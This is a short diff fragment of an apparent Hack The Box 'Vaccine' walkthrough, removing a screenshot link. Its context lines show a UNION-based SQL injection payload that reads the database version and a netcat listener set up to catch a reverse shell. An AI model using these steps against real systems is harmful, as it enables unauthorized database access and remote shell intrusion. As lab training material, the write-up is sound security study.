@@ -76,8 +76,6 @@ source: https://portswigger.net/web-security/sql-injection/union-attacks
 // Insert:
 
 	' UNION SELECT NULL, NULL, NULL , NULL, VERSION() --
-
-![Image 2](https://github.com/W0lfySec/HTB/blob/main/Images/Vaccine/Screenshot_2021-07-31_14_40_43.png)
 // set a listiner
 
 	$ rlwrap nc -lvnp 1444
